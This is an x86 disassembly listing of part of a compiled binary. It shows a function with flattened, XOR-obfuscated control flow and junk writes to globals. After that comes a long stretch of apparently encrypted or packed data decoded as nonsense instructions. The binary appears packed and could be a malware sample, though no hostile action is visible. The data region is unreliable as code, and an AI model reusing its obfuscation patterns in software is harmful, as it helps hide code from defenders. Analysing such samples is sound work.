  40926d:	lea    eax,[ebp-0x60]
  409270:	push   eax
  409271:	mov    eax,DWORD PTR [ebp+0xc]
  409274:	xor    eax,esi
  409276:	add    eax,ebx
  409278:	push   eax
  409279:	mov    eax,ds:0x414b1e
  40927e:	push   0x414a74
  409283:	push   DWORD PTR [eax]
  409285:	call   0x411333
  40928a:	jmp    0x4092c1
  40928f:	cmp    edi,0x13c
  409295:	jne    0x4092c1
  40929b:	mov    eax,DWORD PTR [ebp-0x10]
  40929e:	xor    eax,esi
  4092a0:	add    eax,ebx
  4092a2:	mov    DWORD PTR [ebp+0x8],eax
  4092a5:	mov    eax,ds:0x414afe
  4092aa:	mov    DWORD PTR [ebp+0x8],eax
  4092ad:	mov    eax,DWORD PTR [ebp-0x14]
  4092b0:	mov    DWORD PTR [ebp-0x4],eax
  4092b3:	mov    eax,DWORD PTR [ebp-0x4]
  4092b6:	push   0x4
  4092b8:	pop    ecx
  4092b9:	sub    ecx,eax
  4092bb:	add    ecx,DWORD PTR [ebp-0x18]
  4092be:	mov    DWORD PTR [ebp-0x8],ecx
  4092c1:	mov    eax,DWORD PTR [ebp+0xc]
  4092c4:	xor    eax,esi
  4092c6:	lea    edi,[edi+eax*1+0x327299]
  4092cd:	cmp    edi,0x50a
  4092d3:	jne    0x4089c6
  4092d9:	mov    eax,DWORD PTR [ebp+0xc]
  4092dc:	pop    edi
  4092dd:	xor    eax,esi
  4092df:	pop    esi
  4092e0:	add    eax,ebx
  4092e2:	pop    ebx
  4092e3:	leave  
  4092e4:	ret    0x8
  4092e7:	push   ebp
  4092e8:	mov    ebp,esp
  4092ea:	sub    esp,0x44
  4092ed:	push   edi
  4092ee:	adc    DWORD PTR ds:0x434537,ebx
  4092f4:	mov    eax,DWORD PTR [ebp+0xc]
  4092f7:	mov    DWORD PTR [ebp-0x10],eax
  4092fa:	and    DWORD PTR ds:0x43453b,0x5787
  409304:	jmp    0x40971b
  409309:	jns    0x4092bd
  40930b:	out    dx,al
  40930c:	std    
  40930d:	jge    0x40938c
  40930f:	or     eax,0x11d61472
  409314:	clc    
  409315:	adc    BYTE PTR [edx-0x1d6da7d5],ch
  40931b:	jle    0x40939b
  40931d:	jo     0x409398
  40931f:	jle    0x40939f
  409321:	test   al,0x5f
  409323:	xlat   BYTE PTR ds:[ebx]
  409324:	in     eax,dx
  409325:	pushf  
  409326:	mov    es,ecx
  409328:	lods   al,BYTE PTR ds:[esi]
  409329:	imul   esp,DWORD PTR [edx-0x304f63a7],0xa5a9fedc
  409333:	addr16 call 0x71c0:0x7a7f0e33
  40933b:	sub    dh,BYTE PTR [ecx-0x18896155]
  409341:	sti    
  409342:	inc    ebp
  409343:	inc    esi
  409344:	in     al,dx
  409345:	fstp   DWORD PTR [esi-0x2a]
  409348:	xor    eax,0x855e6632
  40934d:	push   es
  40934e:	adc    dh,BYTE PTR [ebx+0x50a628c6]
  409354:	ins    BYTE PTR es:[edi],dx
  409355:	fucomp st(0)
  409357:	dec    DWORD PTR [esi]
  409359:	test   BYTE PTR [esi+ecx*2],dh
  40935c:	mov    edi,0x9b26802d
  409361:	lock ins DWORD PTR es:[edi],dx
  409363:	cmp    DWORD PTR [ecx-0x3f502e49],ebp
  409369:	xor    BYTE PTR [eax-0x29],0xeb
  40936d:	ins    DWORD PTR es:[edi],dx
  40936e:	(bad)  
  40936f:	pop    eax
  409370:	sub    eax,eax
  409372:	call   0xdcef:0xd08361a7
  409379:	add    BYTE PTR [esi],ch
  40937b:	enter  0x34f8,0x58
  40937f:	cdq    
  409380:	dec    esi
  409381:	jmp    0x60b602fd
  409386:	jne    0x409391
  409388:	xor    al,0x61
  40938a:	je     0x4093dd
  40938c:	popf   
  40938d:	daa    
  40938e:	sub    al,0xca
  409390:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409391:	mov    ebx,0xf2adb725
  409396:	idiv   DWORD PTR [edi+0xb953e36]
  40939c:	xor    eax,0xc71c6494
  4093a1:	mov    ch,0x26
  4093a3:	and    DWORD PTR [eax-0x7c],0x2e2ac95b
  4093aa:	xchg   ebp,eax
  4093ab:	push   edi
  4093ac:	in     eax,0xd2
  4093ae:	lahf   
  4093af:	out    dx,eax
  4093b0:	sbb    DWORD PTR [esi+0x6f431095],ecx
  4093b6:	sar    ecx,0x4c
  4093b9:	test   al,0x4e
  4093bb:	cmp    DWORD PTR [edi+0x4108aaae],ebp
  4093c1:	mov    BYTE PTR ds:0x75d6d7a8,dl
  4093c7:	into   
  4093c8:	es icebp 
  4093ca:	fnstenv [edi+eiz*8-0x17ac552a]
  4093d1:	ror    edi,0xcc
  4093d4:	jmp    0x409398
  4093d6:	pop    esi
  4093d7:	aad    0x3d
  4093d9:	dec    esi
  4093da:	mov    ds:0x3c475407,eax
  4093df:	inc    esp
  4093e0:	loope  0x409429
  4093e2:	fild   DWORD PTR [edi-0x56]
  4093e5:	push   ebx
  4093e6:	pop    es
  4093e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093e8:	ja     0x409377
  4093ea:	ins    BYTE PTR es:[edi],dx
  4093eb:	loopne 0x409441
  4093ed:	fsub   DWORD PTR [ebp-0x212064d2]
  4093f3:	addr16 cmc 
  4093f5:	lock cmp bh,ch
  4093f8:	das    
  4093f9:	cmc    
  4093fa:	in     eax,dx
  4093fb:	pop    ds
  4093fc:	push   cs
  4093fd:	sidtd  [edi+ecx*1-0x44]
  409402:	arpl   WORD PTR [ecx-0x4f],bx
  409405:	lock stc 
  409407:	(bad)
  40940b:	sub    al,0x5c
  40940d:	loopne 0x409465
  40940f:	pop    edx
  409410:	jle    0x40946a
  409412:	(bad)  
  409413:	loope  0x409408
  409415:	ds jbe 0x40943b
  409418:	or     ch,BYTE PTR [ebp+0x68]
  40941b:	pushf  
  40941c:	add    eax,edi
  40941e:	aas    
  40941f:	xlat   BYTE PTR ds:[ebx]
  409420:	sbb    eax,0xf2fe527a
  409425:	xchg   edx,eax
  409426:	jno    0x409433
  409428:	cmc    
  409429:	jl     0x4093ab
  40942b:	cwde   
  40942c:	stos   DWORD PTR es:[edi],eax
  40942d:	jae    0x40947f
  40942f:	mov    fs,edi
  409431:	out    dx,eax
  409432:	jne    0x40947b
  409434:	out    dx,al
  409435:	pop    esi
  409436:	dec    edx
  409437:	push   ebx
  409438:	call   0x91be14b1
  40943d:	pop    edx
  40943e:	cmp    al,0x82
  409440:	push   eax
  409441:	add    BYTE PTR [ebx-0x8],dl
  409444:	sti    
  409445:	ins    BYTE PTR es:[edi],dx
  409446:	ret    
  409447:	sbb    eax,0x59d15dde
  40944c:	jmp    0xa06c:0x7ce3c3ac
  409453:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409454:	mul    bh
  409456:	jns    0x4094c9
  409458:	sbb    eax,0xad045827
  40945d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40945e:	xor    DWORD PTR [esi],edx
  409460:	dec    ecx
  409461:	inc    ebp
  409462:	nop
  409463:	jno    0x4094a7
  409465:	mov    bh,0xf3
  409467:	fbld   TBYTE PTR [esi]
  409469:	inc    edx
  40946a:	cdq    
  40946b:	fwait
  40946c:	mov    ah,BYTE PTR [ecx-0x3d]
  40946f:	mov    al,0x8f
  409471:	dec    edi
  409472:	mov    dh,0x56
  409474:	fucomp st(2)
  409476:	ret    0xdd92
  409479:	js     0x4094cc
  40947b:	dec    ebp
  40947c:	push   0xffffffb9
  40947e:	sbb    ebx,ecx
  409480:	sahf   
  409481:	and    esi,DWORD PTR [edx-0x22]
  409484:	aaa    
  409485:	mov    edi,ebp
  409487:	cli    
  409488:	cmp    eax,0xd4e78cc0
  40948d:	mov    bh,0x39
  40948f:	push   0x1f
  409491:	lea    ecx,[edi+0x37]
  409494:	(bad)  
  409495:	push   esp
  409496:	push   ecx
  409497:	out    0x6f,eax
  409499:	rcl    bh,1
  40949b:	push   ecx
  40949c:	cmp    eax,0xab25430f
  4094a1:	or     ebp,DWORD PTR [ebx+0x60a08229]
  4094a7:	jmp    0x87897eb2
  4094ac:	jmp    0xb526105b
  4094b1:	out    0x1d,eax
  4094b3:	inc    eax
  4094b4:	mov    eax,ds:0x84124900
  4094b9:	xchg   ebx,eax
  4094ba:	cs cmp bp,bp
  4094be:	shr    ebp,1
  4094c0:	mov    dl,0xf
  4094c2:	int    0xe4
  4094c4:	ins    BYTE PTR es:[edi],dx
  4094c5:	jecxz  0x4094dc
  4094c7:	cs out 0x92,al
  4094ca:	into   
  4094cb:	xchg   ecx,eax
  4094cc:	cdq    
  4094cd:	mov    gs,WORD PTR [edx-0x68]
  4094d0:	mov    bl,0xef
  4094d2:	retf   0x32b7
  4094d5:	into   
  4094d6:	scas   al,BYTE PTR es:[edi]
  4094d7:	xchg   esi,eax
  4094d8:	loopne 0x409467
  4094da:	cmc    
  4094db:	mov    ch,0x8b
  4094dd:	mov    ah,al
  4094df:	(bad)  
  4094e0:	jns    0x4094a8
  4094e2:	and    al,0xc9
  4094e4:	adc    BYTE PTR [ecx-0x73],cl
  4094e7:	test   al,0x2a
  4094e9:	sub    bh,BYTE PTR [edx+esi*1+0x39]
  4094ed:	adc    ebp,esp
  4094ef:	or     bl,0x56
  4094f2:	pop    edi
  4094f3:	mov    al,ds:0xed6a5f59
  4094f8:	mov    ds:0x5c277e35,eax
  4094fd:	mov    edx,0xdfe4575e
  409502:	stc    
  409503:	popf   
  409504:	(bad)  
  409505:	mov    ds:0xbc141667,eax
  40950a:	ins    BYTE PTR es:[edi],dx
  40950b:	pop    esp
  40950c:	dec    ebp
  40950d:	loopne 0x4094e0
  40950f:	jo     0x4094f7
  409511:	imul   eax,DWORD PTR [esi+0x7fe2b0a7],0x8dd3cd53
  40951b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40951c:	or     esi,edi
  40951e:	and    BYTE PTR [ebx-0x12910354],al
  409524:	fisubr WORD PTR [esi+0x62835de6]
  40952a:	adc    eax,0x697ccffe
  40952f:	out    dx,eax
  409530:	mov    DWORD PTR [ecx],esi
  409532:	jmp    0x409573
  409534:	hlt    
  409535:	adc    BYTE PTR cs:[eax-0x13a9b1b],bh
  40953c:	hlt    
  40953d:	leave  
  40953e:	cwde   
  40953f:	out    0xc3,al
  409541:	or     al,BYTE PTR [eax+ebx*4]
  409544:	mov    eax,ds:0x4672abd5
  409549:	imul   esi,ebp,0x3b13a660
  40954f:	rcr    BYTE PTR [eax-0x77e781f9],0xe8
  409556:	xchg   edi,eax
  409557:	lods   eax,DWORD PTR ds:[esi]
  409558:	aas    
  409559:	adc    dh,bh
  40955b:	mov    BYTE PTR [esi-0x2c],bl
  40955e:	push   es
  40955f:	in     eax,0xf3
  409561:	sbb    BYTE PTR [edi+0x1c14a18a],bh
  409567:	jne    0x409565
  409569:	jmp    0x40953a
  40956b:	daa    
  40956c:	add    bl,cl
  40956e:	adc    bl,BYTE PTR [ebx-0x568ed7bd]
  409574:	aas    
  409575:	test   BYTE PTR [ebx-0x5c],cl
  409578:	mov    edx,0x8ac60da7
  40957d:	aad    0x80
  40957f:	fild   DWORD PTR [ebx-0xbd3a80c]
  409585:	pusha  
  409586:	iret   
  409587:	stos   DWORD PTR es:[edi],eax
  409588:	inc    ebp
  409589:	mov    ebp,0x62697a6e
  40958e:	loop   0x409607
  409590:	pop    ds
  409591:	sub    ah,BYTE PTR gs:[edx+esi*2]
  409595:	add    eax,0xd1e521bc
  40959a:	adc    eax,0xab0c9e9d
  40959f:	sar    DWORD PTR [esi],1
  4095a1:	cmp    al,BYTE PTR [edx]
  4095a3:	(bad)  
  4095a4:	mov    eax,0xe2b85925
  4095a9:	(bad)  
  4095aa:	cmp    edx,ebx
  4095ac:	popf   
  4095ad:	test   ebx,ebp
  4095af:	call   0x4d817bc6
  4095b4:	jp     0x4095a0
  4095b6:	icebp  
  4095b7:	sub    eax,0x434ee1b3
  4095bc:	sbb    ah,0x10
  4095bf:	mov    ecx,0x19da55f5
  4095c4:	push   edi
  4095c5:	test   al,0x84
  4095c7:	bound  esp,QWORD PTR [edi*4-0x4d285604]
  4095ce:	mul    DWORD PTR [eax+eiz*4]
  4095d1:	(bad)  
  4095d2:	jmp    0xa94fe260
  4095d7:	fbld   TBYTE PTR ds:0x68e68497
  4095dd:	sbb    eax,0x7c29cc67
  4095e2:	iret   
  4095e3:	adc    DWORD PTR [esp+ecx*1],esi
  4095e6:	repnz in al,0xea
  4095e9:	dec    ebx
  4095ea:	sbb    esp,DWORD PTR [ebx-0x8e32128]
  4095f0:	push   0xd7f8e7fd
  4095f5:	sub    BYTE PTR [eax+0xf],al
  4095f8:	sub    ch,BYTE PTR [ebx-0x5f20fe5b]
  4095fe:	cld    
  4095ff:	xchg   esp,eax
  409600:	mov    ds:0x1b87766c,al
  409605:	jl     0x4095c4
  409607:	pop    edx
  409608:	adc    eax,0x824cd31d
  40960d:	dec    ebp
  40960e:	aam    0x4e
  409610:	pop    ss
  409611:	scas   al,BYTE PTR es:[edi]
  409612:	out    0xf1,al
  409614:	jecxz  0x40960d
  409616:	mov    ebp,0xf409b26c
  40961b:	dec    esp
  40961c:	icebp  
  40961d:	jg     0x409695
  40961f:	xchg   edi,eax
  409620:	mov    eax,ds:0x7f10fa15
  409625:	aam    0x78
  409627:	dec    edi
  409628:	push   ecx
  409629:	cdq    
  40962a:	inc    ebp
  40962b:	mov    ch,BYTE PTR [ebp-0x1f8d26c8]
  409631:	lods   al,BYTE PTR ds:[esi]
  409632:	mov    eax,ss:0x76657cf9
  409638:	out    0xca,al
  40963a:	cmp    BYTE PTR [ecx],ah
  40963c:	inc    eax
  40963d:	lds    edx,FWORD PTR [edi]
  40963f:	test   edx,edi
  409641:	mov    ecx,0x578ef5f3
  409646:	and    BYTE PTR [esi-0x1ee86348],cl
  40964c:	sub    BYTE PTR [edx],0xe
  40964f:	bnd jnp 0x4096aa
  409652:	inc    BYTE PTR [eax-0x26]
  409655:	imul   edx,DWORD PTR [esi-0x34a1ee48],0x1eaf2d
  40965f:	cs mov ecx,0xd7d33f20
  409665:	cmp    esp,DWORD PTR [edi-0x1a56cf42]
  40966b:	pop    ss
  40966c:	sbb    DWORD PTR [ebx-0x75f2b304],0x167f88e8
  409676:	clc    
  409677:	repz fdivr QWORD PTR [edx]
  40967a:	loopne 0x409655
  40967c:	mov    edi,DWORD PTR [eax+edx*8]
  40967f:	mov    edi,0x7e12f10e
  409684:	jmp    0x409645
  409686:	sub    eax,DWORD PTR [esi+0x76e833]
  40968c:	aas    
  40968d:	mov    ds:0x2c8a784,eax
  409692:	out    dx,al
  409693:	cmp    bh,BYTE PTR [ebx-0x31ea84d]
  409699:	das    
  40969a:	in     eax,0x94
  40969c:	cmp    esp,ecx
  40969e:	jns    0x409678
  4096a0:	or     al,0x4a
  4096a2:	rol    BYTE PTR [ebx],0xe6
  4096a5:	xor    ch,BYTE PTR [ebx+0x1daa06c2]
  4096ab:	clc    
  4096ac:	mov    esi,0xf6be47f2
  4096b1:	popa   
  4096b2:	or     ecx,DWORD PTR es:[ebx]
  4096b5:	ret    0x3511
  4096b8:	xor    al,0x2f
  4096ba:	inc    edx
  4096bb:	jg     0x409687
  4096bd:	fmul   QWORD PTR [edx+esi*2+0x63]
  4096c1:	gs pop edx
  4096c3:	add    al,0x86
  4096c5:	rcr    BYTE PTR [edi+0x4f],1
  4096c8:	in     eax,dx
  4096c9:	mov    esi,0xf6d7525f
  4096ce:	mov    BYTE PTR [esi],al
  4096d0:	cs clc 
  4096d2:	or     cl,BYTE PTR [ecx]
  4096d4:	popw   ds
  4096d6:	jg     0x4096a3
  4096d8:	push   ds
  4096d9:	sub    edx,DWORD PTR [ebp+0x9]
  4096dc:	(bad)  
  4096dd:	call   DWORD PTR [esi-0x64]
  4096e0:	jb     0x409701
  4096e2:	lds    edx,FWORD PTR ds:0xab4faf02
  4096e8:	shl    DWORD PTR [ebp+0x1e],1
  4096eb:	lods   eax,DWORD PTR ds:[esi]
  4096ec:	mov    ecx,0x7267ea4d
  4096f1:	mov    bl,0x19
  4096f3:	ss cdq 
  4096f5:	icebp  
  4096f6:	ja     0x4096cc
  4096f8:	and    al,0x85
  4096fa:	stc    
  4096fb:	adc    al,bl
  4096fd:	popa   
  4096fe:	fisttp QWORD PTR [eax+0x31]
  409701:	lds    ecx,FWORD PTR [edi+0x59]
  409704:	push   esp
  409705:	inc    ebx
  409706:	or     BYTE PTR [edi-0x50afe9c1],al
  40970c:	mov    ebx,0x227aa80a
  409711:	push   ss
  409712:	mov    cl,0xd4
  409714:	and    esi,esi
  409716:	xchg   DWORD PTR [ecx],edx
  409718:	inc    edx
  409719:	inc    edx
  40971a:	or     eax,0x8b08458b
  40971f:	cmp    eax,0x43460f
  409724:	or     DWORD PTR ds:0x434613,edi
  40972a:	mov    DWORD PTR [ebp+0x8],0xf89c8536
  409731:	xor    edi,0x551
  409737:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40973e:	movzx  ecx,WORD PTR ds:0x4344f3
  409745:	add    ecx,DWORD PTR ds:0x434537
  40974b:	mov    DWORD PTR ds:0x4344f3,ecx
  409751:	mov    edx,DWORD PTR [ebp+0x8]
  409754:	jmp    0x409b6b
  409759:	jmp    0x409767
  40975b:	or     al,0xd8
  40975d:	std    
  40975e:	fdiv   st,st(3)
  409760:	sbb    eax,0x3c00db39
  409765:	or     al,0xe4
  409767:	lea    ebp,[edx-0x6c]
  40976a:	out    dx,al
  40976b:	jle    0x4097eb
  40976d:	jo     0x4097e8
  40976f:	jle    0x4097ef
  409771:	xchg   edi,eax
  409772:	imul   edx,DWORD PTR ds:0x7053396a,0xffffffd8
  409779:	int    0x2c
  40977b:	ins    DWORD PTR es:[edi],dx
  40977c:	fwait
  40977d:	jp     0x40979d
  40977f:	mul    BYTE PTR ds:0x559abbe1
  409785:	(bad)  
  409786:	or     eax,0xcac2f1b3
  40978b:	ins    BYTE PTR es:[edi],dx
  40978c:	pop    edi
  40978d:	xlat   BYTE PTR ds:[ebx]
  40978e:	and    dl,BYTE PTR [edx+0x4cfb509f]
  409794:	fwait
  409795:	push   edi
  409796:	xor    ebp,esp
  409798:	dec    ebx
  409799:	les    esp,FWORD PTR [ebx-0x1058c4d]
  40979f:	pushf  
  4097a0:	mul    BYTE PTR [esi-0x1e7577e1]
  4097a6:	aaa    
  4097a7:	in     eax,0x22
  4097a9:	push   edx
  4097aa:	dec    ebp
  4097ab:	add    bl,cl
  4097ad:	push   ecx
  4097ae:	cwde   
  4097af:	aas    
  4097b0:	mov    dh,0x2a
  4097b2:	push   cs
  4097b3:	push   eax
  4097b4:	(bad)  
  4097b5:	in     al,dx
  4097b6:	mov    dh,0xc2
  4097b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097b9:	dec    esp
  4097ba:	cdq    
  4097bb:	mov    ah,0xd1
  4097bd:	test   eax,0x846747eb
  4097c2:	or     DWORD PTR [edi+0x6b2c370e],ebp
  4097c8:	lods   eax,DWORD PTR ds:[esi]
  4097c9:	call   0xf7d0:0x591bfc9e
  4097d0:	cmp    DWORD PTR [ebx-0x4fe20e29],edx
  4097d6:	cmp    eax,0xb51c427b
  4097db:	and    al,BYTE PTR [ecx]
  4097dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097de:	jnp    0x409789
  4097e0:	mov    WORD PTR [edx],gs
  4097e2:	adc    eax,ebx
  4097e4:	jmp    0x4097ac
  4097e6:	inc    ebx
  4097e7:	sub    al,0x7a
  4097e9:	xchg   ecx,eax
  4097ea:	fistp  WORD PTR [esi+esi*2-0x4d]
  4097ee:	int3   
  4097ef:	sub    BYTE PTR [esi+0x594c691b],bh
  4097f5:	enter  0xed94,0x2c
  4097f9:	in     al,dx
  4097fa:	out    dx,eax
  4097fb:	call   0x4209:0x799e802d
  409802:	sub    cl,BYTE PTR [esi-0x7f]
  409805:	(bad)  
  409806:	jo     0x4097fc
  409808:	or     eax,DWORD PTR ds:0x47e0df6c
  40980e:	sbb    al,0xc8
  409810:	or     edi,0x5c
  409813:	pop    edi
  409814:	out    dx,eax
  409815:	retf   
  409816:	retf   0xbfb
  409819:	xor    BYTE PTR [esp+ecx*2-0x1dea76c6],ah
  409820:	test   BYTE PTR [edi-0x590e45e4],ah
  409826:	xchg   DWORD PTR [esi],edx
  409828:	sbb    dl,BYTE PTR [eax]
  40982a:	popa   
  40982b:	sahf   
  40982c:	js     0x409870
  40982e:	pop    ss
  40982f:	jmp    0x409887
  409831:	push   0x14de1145
  409836:	push   ebx
  409837:	std    
  409838:	mov    ?,eax
  40983a:	daa    
  40983b:	xchg   esi,eax
  40983c:	int3   
  40983d:	loop   0x4097cb
  40983f:	inc    ebp
  409840:	jno    0x40984f
  409842:	mov    eax,ds:0x162985de
  409847:	xor    al,0x9a
  409849:	loope  0x40989b
  40984b:	idiv   DWORD PTR [esi-0x11]
  40984e:	jb     0x4097ee
  409850:	adc    DWORD PTR [ebx+eax*8-0x4f],ebx
  409854:	xchg   DWORD PTR [esi-0x2645af11],ebx
  40985a:	jnp    0x409881
  40985c:	frstor [edx+0x5e]
  40985f:	push   es
  409860:	aad    0x64
  409862:	mov    ah,0x6b
  409864:	cmc    
  409865:	adc    ch,BYTE PTR [eax-0x68ee4e10]
  40986b:	dec    esp
  40986c:	pushf  
  40986d:	push   esp
  40986e:	push   edi
  40986f:	mov    esp,0xab859fa6
  409874:	je     0x40985d
  409876:	xchg   ebx,eax
  409877:	inc    ebp
  409878:	push   esp
  409879:	push   esi
  40987a:	and    edx,DWORD PTR [eax-0x36]
  40987d:	xchg   esp,eax
  40987e:	mov    esi,0x474ae9b8
  409883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409884:	jbe    0x409880
  409886:	xchg   ebx,eax
  409887:	out    0x41,eax
  409889:	dec    ebp
  40988a:	cmp    esp,esp
  40988c:	xchg   ebp,eax
  40988d:	pushf  
  40988e:	mov    edi,0xddb28885
  409893:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409894:	je     0x4098ac
  409896:	pop    ds
  409897:	jb     0x40986b
  409899:	test   BYTE PTR [edx],0x72
  40989c:	enter  0x9f10,0x63
  4098a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098a1:	mov    ss,WORD PTR [edi+0x2]
  4098a4:	dec    ecx
  4098a5:	fcmovnbe st,st(0)
  4098a7:	(bad)  
  4098a8:	aam    0x36
  4098aa:	or     eax,ebp
  4098ac:	loopne 0x40987e
  4098ae:	or     eax,0x4f279c1c
  4098b3:	sbb    ebp,edi
  4098b5:	(bad)  
  4098b6:	in     al,dx
  4098b7:	fxtract 
  4098b9:	xchg   edi,edx
  4098bb:	fdivr  DWORD PTR [eax]
  4098bd:	mov    eax,0x3a96a292
  4098c2:	dec    ecx
  4098c3:	push   ss
  4098c4:	popa   
  4098c5:	and    eax,0x24e40a00
  4098ca:	mov    esp,0x84f49693
  4098cf:	push   edi
  4098d0:	ret    0x1212
  4098d3:	aaa    
  4098d4:	sub    ebp,DWORD PTR [edx+0x7f7dbb39]
  4098da:	push   edi
  4098db:	push   esp
  4098dc:	and    al,BYTE PTR [esi]
  4098de:	and    BYTE PTR [esi-0x80],al
  4098e1:	mov    dl,0x7e
  4098e3:	ror    BYTE PTR [eax-0x56d9d6da],1
  4098e9:	jp     0x409928
  4098eb:	fcmove st,st(5)
  4098ed:	pop    esp
  4098ee:	sub    DWORD PTR [ecx+eax*1-0x5228c7c8],edi
  4098f5:	pushf  
  4098f6:	mov    al,ds:0x57c487b5
  4098fb:	test   dh,cl
  4098fd:	fsubrp st(0),st
  4098ff:	and    DWORD PTR ds:0xe483a9aa,esp
  409905:	cmp    eax,0x5c9b44e6
  40990a:	repnz add eax,0x1cb776f9
  409910:	dec    esi
  409911:	out    0xe7,al
  409913:	js     0x409982
  409915:	mov    WORD PTR [bx+di+0x28af],?
  40991a:	jle    0x40996c
  40991c:	or     ah,BYTE PTR [edi+0x2c]
  40991f:	jno    0x409959
  409921:	adc    DWORD PTR [esi-0x5a70ac76],eax
  409927:	inc    ecx
  409928:	in     al,dx
  409929:	xlat   BYTE PTR ds:[ebx]
  40992a:	or     BYTE PTR [edi+0x259e1c60],al
  409930:	inc    ebp
  409931:	adc    eax,0xf6e84f46
  409936:	cmp    BYTE PTR [esi-0x7e],dh
  409939:	inc    ebp
  40993a:	outs   dx,BYTE PTR ds:[esi]
  40993b:	imul   ecx,DWORD PTR [edx+0x26],0xd866e6f3
  409942:	into   
  409943:	sub    al,0xfd
  409945:	ficomp WORD PTR [ecx-0x46aa6c3b]
  40994b:	in     eax,0xbd
  40994d:	cmp    DWORD PTR [edx-0x21],0xffffffb5
  409951:	test   al,0xe3
  409953:	shr    DWORD PTR [esi],cl
  409955:	cmc    
  409956:	jne    0x409927
  409958:	rcl    DWORD PTR [esi+0x91813a2],0x46
  40995f:	mov    ?,ecx
  409961:	ds pop eax
  409963:	dec    edx
  409964:	pop    esp
  409965:	aaa    
  409966:	mov    ebx,0xa922b5b0
  40996b:	dec    ebx
  40996c:	adc    cl,BYTE PTR [esi+0x46]
  40996f:	cs out 0xd5,al
  409972:	xor    eax,0x7df848ab
  409977:	icebp  
  409978:	push   ebp
  409979:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40997a:	sub    BYTE PTR [edx],dh
  40997c:	xchg   edi,eax
  40997d:	lods   eax,DWORD PTR ds:[esi]
  40997e:	mov    edx,0x5aafbb46
  409983:	das    
  409984:	mov    dl,0x16
  409986:	mov    ch,0x26
  409988:	je     0x409912
  40998a:	fsubr  QWORD PTR [edi]
  40998c:	mov    ebx,0xf8d4e55d
  409991:	sub    eax,0xdcbfac50
  409996:	arpl   WORD PTR [eax+0x4bc211e3],bp
  40999c:	pop    es
  40999d:	(bad)
  4099a0:	jecxz  0x4099e5
  4099a2:	jle    0x409a04
  4099a4:	aam    0x2d
  4099a6:	dec    ecx
  4099a7:	sub    DWORD PTR [ebp+ecx*1-0x4a9fcec],edi
  4099ae:	ja     0x40994e
  4099b0:	jno    0x4099c5
  4099b2:	mov    eax,ds:0x77b946fa
  4099b7:	js     0x4099fc
  4099b9:	dec    ebp
  4099ba:	ins    BYTE PTR es:[edi],dx
  4099bb:	jo     0x409a2e
  4099bd:	retf   
  4099be:	mov    dl,0x3b
  4099c0:	add    DWORD PTR [edi],ebp
  4099c2:	add    DWORD PTR [edx-0x33d61e1b],ebx
  4099c8:	push   eax
  4099c9:	inc    ebp
  4099ca:	pusha  
  4099cb:	sub    eax,DWORD PTR [ebp+0x6f12fe10]
  4099d1:	outs   dx,DWORD PTR ds:[esi]
  4099d2:	shl    DWORD PTR [ecx-0x781b8de0],cl
  4099d8:	int3   
  4099d9:	pop    ds
  4099da:	sbb    dl,BYTE PTR [ecx-0x1a]
  4099dd:	dec    ebp
  4099de:	dec    eax
  4099df:	dec    esi
  4099e0:	pop    ss
  4099e1:	add    DWORD PTR [edi-0x65d7a875],ebx
  4099e7:	xor    al,0xac
  4099e9:	and    al,0x91
  4099eb:	bnd call 0x4e1982a1
  4099f1:	rcl    BYTE PTR [ebx],1
  4099f3:	cwde   
  4099f4:	hlt    
  4099f5:	lahf   
  4099f6:	adc    eax,0x24b99439
  4099fb:	aas    
  4099fc:	popa   
  4099fd:	out    dx,al
  4099fe:	inc    ecx
  4099ff:	cmc    
  409a00:	mov    DWORD PTR [edx+0x4e],edx
  409a03:	loope  0x4099ad
  409a05:	lods   eax,DWORD PTR ds:[esi]
  409a06:	xlat   BYTE PTR ds:[ebx]
  409a07:	pop    ss
  409a08:	sub    DWORD PTR ds:0x56cf47ca,esi
  409a0e:	mov    ds:0xb6980794,eax
  409a13:	adc    eax,0xd4262b53
  409a18:	push   0xd6fa2fb4
  409a1d:	dec    ebx
  409a1e:	sbb    edi,DWORD PTR [ecx+0x67292f8f]
  409a24:	xor    edx,DWORD PTR [ebp+ebx*2+0x59338357]
  409a2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a2c:	xchg   ebx,eax
  409a2d:	shl    DWORD PTR [edi+ebx*4],0xa3
  409a31:	pop    es
  409a32:	push   eax
  409a33:	in     eax,dx
  409a34:	mov    bl,0xf
  409a36:	iret   
  409a37:	inc    esp
  409a38:	cmp    edi,ecx
  409a3a:	fadd   DWORD PTR [eax-0x34234924]
  409a40:	fdivr  DWORD PTR [edx+0x2f]
  409a43:	mov    ds:0xab54025c,al
  409a48:	aas    
  409a49:	stos   BYTE PTR es:[edi],al
  409a4a:	and    edx,DWORD PTR [ebx+0x5ef9e157]
  409a50:	mov    cl,dh
  409a52:	xchg   edx,eax
  409a53:	sahf   
  409a54:	xor    DWORD PTR [esi+0x1e83ca39],edx
  409a5a:	imul   ebp,edi,0xffffff8d
  409a5d:	and    al,0x28
  409a5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a60:	fmul   st,st(2)
  409a62:	aaa    
  409a63:	push   ecx
  409a64:	out    0x85,eax
  409a66:	(bad)  
  409a67:	lods   eax,DWORD PTR ds:[esi]
  409a68:	dec    eax
  409a69:	push   edx
  409a6a:	ds inc esi
  409a6c:	pop    edx
  409a6d:	xchg   BYTE PTR ds:0x8f16157e,bh
  409a73:	es jo  0x4099fa
  409a76:	and    BYTE PTR [edx-0x498cbcc9],dh
  409a7c:	fnstcw WORD PTR [eax]
  409a7e:	(bad)  
  409a7f:	out    0x95,al
  409a81:	jp     0x409a61
  409a83:	lahf   
  409a84:	add    DWORD PTR ss:[esi],0xcb02b67
  409a8b:	sti    
  409a8c:	mov    eax,ds:0x269e3518
  409a91:	mov    bh,0x2c
  409a93:	fnstsw WORD PTR [ebx+0x109f6068]
